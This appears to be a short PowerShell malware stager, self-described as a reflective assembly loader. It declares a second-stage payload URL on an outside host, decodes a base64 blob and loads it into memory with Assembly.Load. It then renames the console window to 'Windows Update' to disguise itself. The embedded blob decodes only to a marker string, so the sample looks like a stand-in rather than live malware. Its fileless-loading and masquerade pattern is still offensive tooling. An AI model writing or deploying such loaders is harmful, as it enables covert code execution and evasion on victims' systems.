
<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
[CmdletBinding()]
param(
    [string]$Stage2Url = "https://203.0.113.215/payload.bin",
    [int]$TimeoutSec = 126
)
$ErrorActionPreference = "Stop"

try {
    $PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp4amQ2MHQxNHpi')
    Write-Verbose ("Assembly byte count: " + $PayloadBytes.Length)
    $StageResult = [Reflection.Assembly]::Load($PayloadBytes)
    if ($null -ne $StageResult) {
        Write-Verbose ("Loaded assembly: " + $StageResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$Host.UI.RawUI.WindowTitle = "Windows Update"
Set-Location -Path $env:TEMP
